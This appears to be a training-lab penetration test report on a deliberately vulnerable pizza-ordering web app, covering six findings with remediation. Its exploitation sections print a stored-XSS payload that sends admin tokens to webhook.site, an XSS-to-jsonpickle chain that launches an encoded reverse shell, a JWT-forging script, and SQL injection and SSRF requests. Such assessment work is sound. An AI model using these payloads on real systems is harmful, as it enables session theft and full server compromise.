# Offensive Security OSCP Exam Penetration Test Report

## 1.1 Introduction

This report documents the security assessment performed against **MyPizzaApp**, a web application developed for the UBIK Learning Academy platform. The application allows users to order pizzas and settle payments using a virtual currency called UBIKs. This assessment simulates a realistic white-box attack scenario, progressing from an unauthenticated posture to complete server compromise.

## 1.2 Objective

The primary objective of this assessment is to identify structural, cryptographic, and implementation flaws within MyPizzaApp, demonstrate their impact through a structured exploit chain, and provide actionable remediation guidelines to secure the application infrastructure before production deployment.

## 1.3 Requirements

The audit was conducted under the following parameters:

* **Approach**: White-box assessment with full access to backend and frontend source code.
* **Scope**: Complete application ecosystem including the Angular frontend, FastAPI/Python backend, Nginx reverse proxy, and PostgreSQL database layer.
* **Execution**: Static Application Security Testing (SAST), manual code review, and dynamic validation of identified vectors.

---

## 2 High-Level Summary

MyPizzaApp suffers from systemic architectural and implementation weaknesses that completely undermine its security model. A remote, unauthenticated attacker can chain an input validation failure (Stored XSS) with unsafe deserialization logic to achieve arbitrary Remote Code Execution (RCE) on the host system as the root user. Cryptographic secrets are hardcoded throughout the source repository, allowing for trivial offline token forgery.

### 2.1 Recommendations

1. **Eliminate Unsafe Deserialization**: Completely remove `jsonpickle.decode` with `safe=False`. Implement strong input schema parsing using static Pydantic models.
2. **Context-Aware Output Encoding**: Remove all instances of Angular’s `bypassSecurityTrustHtml` on user-supplied parameters and enforce strict server-side HTML sanitization or pure-text rendering.
3. **Secrets Externalization**: Purge all hardcoded credentials, JWT signature keys, and database connection strings from code repositories and use environment variables managed via a secure secrets manager.
4. **Session Security Upgrades**: Transition token storage from `localStorage` to `HttpOnly`, `Secure`, and `SameSite=Strict` cookies to effectively neutralize token theft via client-side injection vectors.

### 2.2 Identified Vulnerabilities

| Vulnerability | Severity | OWASP Top 10 Reference | Status |
| --- | --- | --- | --- |
| **Unsafe Object Deserialization via jsonpickle** | Critical | A03:2021-Injection | Exploited |
| **Stored Cross-Site Scripting (XSS) via Comments** | Critical | A03:2021-Injection | Exploited |
| **Hardcoded Cryptographic Secrets & Credentials** | Critical | A05:2021-Security Misconfiguration | Exploited |
| **SQL Injection via Category Filter** | High | A03:2021-Injection | Verified |
| **Server-Side Request Forgery (SSRF) via Pizza Image URL** | High | A10:2021-Server-Side Request Forgery | Verified |
| **Flawed Client-Side Role Validation Trust** | High | A01:2021-Broken Access Control | Verified |

---

## 3 Methodologies

### 3.1 Information Gathering

Static evaluation began by analyzing repository configurations, deployment manifests (`docker-compose.yml`), database migration instructions (`alembic.ini`), and environment configurations (`environment.prod.ts`). This targeted phase mapping uncovered active exposed architectural assumptions and structural endpoints.

### 3.2 Service Enumeration

The target application components were enumerated to reveal the following open service structure:

* **Port 80/443**: Nginx reverse proxy routing traffic to front and backend endpoints.
* **Port 7465**: Internal Python backend application running FastAPI.
* **API Route Mapping**: Discovery of the `/api/pizza/create`, `/api/pizza/category/{category}`, and `/api/users/` routes via static code structure analysis.

### 3.3 Penetration

The penetration phase followed a strict chronological execution narrative:

1. **Registration**: An unprivileged account was registered through the public front-end interface.
2. **Stored XSS Injection**: A malicious payload was submitted to the pizza comment section utilizing an un-sanitized attribute path.
3. **Token Harvesting**: The automated background administrative review bot executed the payload, exfiltrating a valid administrative JWT via an out-of-band request.
4. **RCE Execution**: The stolen administrative credential was used to submit a crafted payload containing a Python deserialization gadget against the pizza creation endpoint, triggering a reverse shell to the monitoring machine.

### 3.4 Maintaining Access

Access persistence was achieved by interacting directly with the local PostgreSQL database service exposed to the application runtime environment. Running local client commands, the attacker modified database entries to escalate the privileges of their standard user account to the permanent `Admin` role.

### 3.5 House Cleaning

Following successful exploitation, logs and temporary artifacts were evaluated. Created test comments were purged via database controls, and reverse shell processes were securely terminated to ensure the environment reverted to a stable baseline.

---

## 4 Independent Challenges

### Target Name: MyPizzaApp Component Ecosystem

---

### Finding 1: Remote Code Execution via Unsafe jsonpickle Deserialization

* **CVSS 4.0 Score**: 9.4 (Critical)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
* **Summary**: The backend endpoint handles input decoding through an unrestricted deserialization library configuration, allowing authenticated administrators to execute arbitrary OS commands.
* **Description**: The endpoint `/api/pizza/create` within `backend/src/awefull_pizza_shop/webserver/routers/pizza.py` takes raw input data and passes it directly to `jsonpickle.decode(..., safe=False)`. Because the execution environment explicitly disables safety limitations, processing incoming parameters containing custom object reconstruction rules triggers arbitrary code execution within the context of the running application process.
* **OWASP Top 10**: A03:2021-Injection
* **Initial Access**: Authenticated administrative session required (obtained via Finding 2 or Finding 3).

#### Post Exploitation

Using a structured python execution block payload wrapped in a base64 encoding wrapper string, a reverse shell connection was initialized back to the controller interface at `172.27.248.70:9001`:

```html
<img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/object':'awefull_pizza_shop.webserver.schemas.PizzaCreation','name':{'py/reduce':[{'py/type':'subprocess.getoutput'},{'py/tuple':['echo $RANDOM; echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4yNy4yNDguNzAiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc= | base64 -d | bash &']}]},'description':'pwned','price':13.37,'image_url':'http://x','category':'MEAT'})});">

```

The server accepted and processed the input payload, returning a functional root-level prompt inside the docker infrastructure space.

* **Impact**: Total compromise of the application backend environment, allowing modification of database files, extraction of runtime keys, and pivot capabilities deeper into adjacent virtual container architectures.

#### Recommendations

* Completely remove `jsonpickle.decode` from input processing paths.
* Enforce type-safe native parsing frameworks (such as Pydantic structural specifications or standard python `json.loads`) to safely map properties without evaluation logic.

#### References

* [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

---

### Finding 2: Administrative Token Theft via Stored Cross-Site Scripting (XSS)

* **CVSS 4.0 Score**: 8.7 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N
* **Summary**: User-supplied comments are handled without proper sanitization, allowing standard application accounts to inject script content executed by internal administrative simulation components.
* **Description**: The template file `pizza-comment-card.component.html` renders comments using the `[innerHTML]` property assignment linked with an explicit bypass filter rule (`bypassSecurityTrustHtml`) inside the component controller file. This bypass deactivates native platform cross-site scripting controls. Concurrently, an exposed poller framework (`xss-poller.mjs`) instructs an administrative test account simulation script to browse public comment locations while maintaining a live administrative credential token inside browser storage.
* **OWASP Top 10**: A03:2021-Injection
* **Initial Access**: Yes. This finding is the primary entry vector used to escalate privileges from a standard registered client to an administrator.

#### Post Exploitation

An unprivileged account posted a customized observation block incorporating a script event handler tracking to an external capture link destination:

```html
<img src="x" onerror="window.location.href='https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?token=' + localStorage.getItem('access_token') + '&page=' + window.location.pathname + '&user=xss_poller';">

```

When the automation process evaluated the submitted location record, it triggered the script event logic, leaking a valid administrative authentication string back to the capture endpoint logs within the expiration time limit framework.

* **Impact**: Complete compromise of active site operator sessions, exposing configuration screens, user account adjustment parameters, and higher-privileged API targets.

#### Recommendations

* Eliminate the usage of `bypassSecurityTrustHtml` on text segments provided by users.
* Implement context-aware validation parameters or enforce safe content compilation via strict server-side rendering policies (e.g., Bleach framework controls).
* Migrate administrative authentication objects from JavaScript accessible `localStorage` structures into `HttpOnly` cookie values.

#### References

* [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

### Finding 3: Cryptographic Compromise via Hardcoded Operational Secrets

* **CVSS 4.0 Score**: 8.6 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
* **Summary**: Production deployment files and application source modules maintain identical static secret string configurations, permitting direct generation of validated administrative sessions.
* **Description**: Cryptographic verification keys and critical target connection configurations are committed explicitly within version repository structures:
* `docker-compose.yml`: `SuperSecretKeyThatIsTottalyNotRandom`
* `config.py`: `JWT_SECRET_KEY = "changeme"`
* `environment.prod.ts`: `jwtSecret: "SuperSecretKeyThatIsTottalyNotRandom"`


* **OWASP Top 10**: A05:2021-Security Misconfiguration
* **Initial Access**: Yes. Knowing these values allows an attacker to bypass all frontend security components by minting arbitrary valid signatures locally.

#### Post Exploitation

Using local scripting tools, an attacker can create an administrative credential identity structure signature using the leaked static repository verification parameter key:

```python
import jwt
import time

secret = "SuperSecretKeyThatIsTottalyNotRandom"
payload = {
    "sub": "username:admin_user",
    "role": "Admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}
forged_token = jwt.encode(payload, secret, algorithm="HS256")
print(forged_token)

```

The resulting token value can be placed directly into a browser session storage layer, enabling immediate administrative access to restricted application management routes.

* **Impact**: Total authorization bypass across the target application ecosystem. Attackers can assume any identity structure or administrative status without tracking or verification checks.

#### Recommendations

* Purge structural signature configuration entries from source material definitions completely.
* Inject operational environment target secrets dynamically during infrastructure startup via secure, externalized configuration mechanisms.

#### References

* [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

---

### Finding 4: Comprehensive Data Dump via Category Filter SQL Injection

* **CVSS 4.0 Score**: 7.4 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
* **Summary**: The category extraction filter compiles search queries using raw concatenation logic, enabling data structure modification and arbitrary extraction commands.
* **Description**: The database interaction layer mapped to the route `/api/pizza/category/{category}` within `backend/src/awefull_pizza_shop/database/pizza/repository.py` handles variable sorting criteria using raw format definitions (`text(f"category='{category}'")`). Lacking structural processing abstraction rules, characters appended to incoming request parameters alter query evaluation logic paths.
* **OWASP Top 10**: A03:2021-Injection

#### Post Exploitation

An authenticated user submitted an escaped string structure value designed to bypass query logic checks:

```javascript
fetch("https://app1.tiweb.tp.ubik.academy/api/pizza/category/MEAT'%20OR%201=1--", {
  method: 'GET',
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('access_token') }
})

```

The backend processed the query and disabled the filtering rule logic, returning a full object structural breakdown of all application catalog elements regardless of visibility status rules.

* **Impact**: Unauthorized access to underlying database information schemas, enabling data exfiltration, disclosure of configuration baselines, or modification of persistent tables if system write permissions allow.

#### Recommendations

* Replace all inline dynamic query string structures with proper ORM parameterization abstractions.
* Bind parameters cleanly into predefined typing frameworks instead of applying native concatenation routines.

#### References

* [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)

---

### Finding 5: Server-Side Request Forgery (SSRF) via Pizza Image Resource Targets

* **CVSS 4.0 Score**: 7.1 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N
* **Summary**: The application accepts arbitrary address parameters within resource initialization routines, permitting interaction with protected internal assets.
* **Description**: Object initialization parsing within `schemas/pizza.py` takes incoming strings for properties like `image_url` without validation constraints. When administrative users or internal browser engine processes handle these values, the host system performs outbound lookups to the specified locations, bypassing boundary access restrictions.
* **OWASP Top 10**: A10:2021-Server-Side Request Forgery

#### Post Exploitation

An administrator populated an object registration block targeting an out-of-band monitoring asset:

```javascript
body: JSON.stringify({
  "py/object": "awefull_pizza_shop.webserver.schemas.PizzaCreation",
  "name": "SSRF Test",
  "description": "Testing SSRF",
  "price": 10.0,
  "image_url": "https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac",
  "category": "MEAT"
})

```

The backend components completed the validation process and initiated outbound connections to the test location, confirming that the server interacts directly with unverified network destinations.

* **Impact**: Internal network exposure, scanning capabilities against private microservices, and potential exposure of cloud metadata points or adjacent data stores.

#### Recommendations

* Implement strict destination whitelisting rules restricting inputs to trusted, explicit domains.
* Use strict type checking (e.g., Pydantic's `HttpUrl`) and reject internal network address schemes (`file://`, `gopher://`, localhost loopbacks).

#### References

* [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)